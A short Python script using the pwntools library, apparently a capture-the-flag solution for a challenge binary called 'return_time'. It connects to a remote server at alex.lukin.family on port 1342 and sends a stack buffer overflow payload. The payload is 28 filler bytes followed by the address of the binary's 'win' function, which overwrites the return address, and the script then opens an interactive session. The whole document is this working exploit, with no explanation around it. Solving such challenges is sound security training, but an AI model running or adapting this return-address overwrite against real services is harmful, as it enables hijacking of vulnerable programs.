from pwn import *

path='./files/return_time'

p = remote('alex.lukin.family', 1342)
# p = process(path)
binary = ELF(path)

payload = b'a'*28
addr = binary.symbols['win']
payload += p32(addr)
p.sendline(payload)
p.interactive()